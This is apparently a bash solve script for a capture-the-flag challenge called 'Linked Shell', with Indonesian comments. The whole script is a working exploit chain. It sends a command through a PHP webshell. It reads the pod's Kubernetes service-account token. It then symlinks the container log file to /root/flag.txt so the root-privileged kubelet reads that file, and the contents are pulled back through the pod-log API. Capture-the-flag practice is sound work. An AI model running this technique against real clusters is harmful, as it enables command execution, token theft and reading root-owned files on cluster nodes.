#!/usr/bin/env bash
# Linked Shell (LappungCTF). Nama parameter webshell berasal dari XOR di source:
# nama fungsi di $_POST, argumen di $____.
set -euo pipefail
URL="${1:-http://linked-shell.lappungctf.id/}"

# Jalan di dalam pod: arahkan file log container kita ke /root/flag.txt, lalu baca
# log pod sendiri supaya kubelet (root di node) yang mengikuti symlink-nya.
read -r -d '' PAYLOAD <<'EOF' || true
SA=/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat "$SA/token"); NS=$(cat "$SA/namespace")
API="https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"
POD=$(hostname)
LOG=$(readlink -f "$(ls -1 /var/log/containers/${POD}_${NS}_php-*.log | head -1)")
ln -sf /root/flag.txt "$LOG"
curl -sk "$API/api/v1/namespaces/$NS/pods/$POD/log?container=php&tailLines=5" \
  -H "Authorization: Bearer $TOKEN"
EOF

RESP=$(curl -s "$URL" --data-urlencode '_POST=system' --data-urlencode "____=$PAYLOAD" || true)
FLAG=$(printf '%s' "$RESP" | grep -oE 'LappungCTF\{[^}]*\}' | head -1)

# Flag bocor mentah di pesan error parser CRI kubelet; tampilkan baris itu.
printf '%s\n' "$RESP" | grep -oE 'failed to get parse function:.*'

if [ -n "${FLAG:-}" ]; then
  echo "[+] $FLAG"
else
  echo "[-] flag belum keluar, cronjob cleanup mungkin sudah menghapus symlink; coba lagi" >&2
  exit 1
fi
